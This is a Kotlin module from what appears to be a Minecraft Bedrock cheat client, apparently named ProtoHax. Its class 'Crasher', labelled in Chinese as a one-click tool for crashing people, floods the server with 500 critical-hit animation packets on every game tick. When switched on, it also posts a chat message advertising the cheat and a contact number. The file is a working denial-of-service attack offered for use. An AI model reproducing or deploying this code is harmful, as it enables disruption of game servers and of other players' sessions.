package dev.sora.relay.cheat.module.impl.misc

import com.nukkitx.protocol.bedrock.packet.AnimatePacket
import com.nukkitx.protocol.bedrock.packet.TextPacket
import dev.sora.relay.cheat.module.CheatModule
import dev.sora.relay.game.event.Listen
import dev.sora.relay.game.event.EventTick
import dev.sora.relay.utils.getRandomString
import kotlin.random.Random

class ModuleCrasher : CheatModule("Crasher","一键崩人") {

    override fun onEnable() {
        super.onEnable()
        session.sendPacket(TextPacket().apply {
            type = TextPacket.Type.CHAT
            xuid = session.xuid
            sourceName = session.displayName
            platformChatId = ""
            message = "我已启用ProtoHax的神秘科技|获取→723293793 >${getRandomString(2 + Random.nextInt(5))}<"
        })
    }
    @Listen
    fun onTick(event: EventTick) {
        val netSession = event.session.netSession
        val packet = AnimatePacket().apply {
            action = AnimatePacket.Action.CRITICAL_HIT
            runtimeEntityId = event.session.thePlayer.entityId
        }
        repeat(500) {
            netSession.outboundPacket(packet)
        }
    }
}